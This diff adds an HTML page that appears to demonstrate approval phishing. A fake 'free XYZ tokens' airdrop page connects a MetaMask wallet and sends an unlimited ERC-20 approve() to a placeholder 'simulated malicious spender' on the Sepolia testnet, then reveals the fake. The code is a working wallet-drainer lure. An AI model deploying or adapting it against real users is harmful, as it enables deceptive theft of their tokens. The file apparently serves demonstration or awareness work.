@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Claim Your XYZ Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      background: #f9f9f9;
+    }
+    h1 {
+      color: #2a9d8f;
+    }
+    button {
+      padding: 12px 24px;
+      margin: 10px;
+      font-size: 16px;
+      background-color: #264653;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #2a9d8f;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 Claim Your Free XYZ Tokens!</h1>
+  <p>Connect your wallet to receive a bonus airdrop of 500 XYZ tokens instantly.</p>
+
+  <button id="connect">🔌 Connect Wallet</button>
+  <button id="claim">💰 Claim Airdrop</button>
+
+  <script>
+    // LINK token on Sepolia testnet
+    const tokenAddress = "0x779877A7B0D9E8603169DdbD7836e478b4624789";
+
+    // Simulated malicious spender address
+    const maliciousSpender = "0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF";
+
+    const abi = [
+      "function approve(address spender, uint256 amount) external returns (bool)"
+    ];
+
+    let signer;
+
+    document.getElementById("connect").onclick = async () => {
+      if (!window.ethereum) {
+        alert("Please install MetaMask.");
+        return;
+      }
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      const address = await signer.getAddress();
+      alert("Wallet connected: " + address);
+    };
+
+    document.getElementById("claim").onclick = async () => {
+      if (!signer) {
+        alert("Please connect your wallet first.");
+        return;
+      }
+
+      const token = new ethers.Contract(tokenAddress, abi, signer);
+      const maxApproval = ethers.constants.MaxUint256;
+
+      try {
+        const tx = await token.approve(maliciousSpender, maxApproval);
+        alert("⚠️ Transaction Sent!\n\nTX Hash: " + tx.hash + "\n\n(Note: This was not a real airdrop — it was a fake approval!)");
+      } catch (err) {
+        alert("❌ Transaction rejected or failed.");
+        console.error(err);
+      }
+    };
+  </script>
+</body>
+</html>
